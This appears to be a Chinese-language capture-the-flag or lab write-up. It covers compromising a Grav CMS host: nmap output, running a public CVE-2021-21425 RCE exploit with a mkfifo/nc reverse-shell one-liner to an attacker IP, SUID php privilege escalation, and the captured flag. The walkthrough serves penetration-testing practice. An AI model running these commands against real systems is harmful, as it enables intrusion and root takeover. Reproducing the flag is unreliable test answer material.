nmap 的結果
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

網頁打開進去後是一個 grav 的 CMS 網站 都沒有可以利用的地方 上網有找到可以 RCE 的 [exploit](https://github.com/CsEnox/CVE-2021-21425/tree/main) (這裡怪怪的 沒有版本號或什麼提示)

透過 bind shell 建立連線 `python3 exploit.py -c 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.45.201 80 > /tmp/f' -t http://192.168.186.12/grav-admin` (用 reverse=hell generate 時一直失敗 之後才發現因為 reverseshell generate 的 nc 有加 -i 這樣變成是等人來連 所以要把 -i 拿掉 讓他自己去連)

連上後無法 `sudo -l` 使用 `find / -perm -4000 2>/dev/null` 有看到 `/usr/bin/php7.4` 應該有 SUID 可以使用 在 [GTFOBins](https://gtfobins.github.io/gtfobins/php/?source=post_page-----627bc41a86ef--------------------------------) 找到 可以利用 `./php -r "pcntl_exec('/bin/sh', ['-p']);"` 提權
於是輸入 `/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"` 成功提權
![image](https://hackmd.io/_uploads/B1Z2QGZryg.png)

拿到 flag `66cc737cd3c7b3a913d9b927a19336af`
![image](https://hackmd.io/_uploads/Hkr6mfWrkg.png)
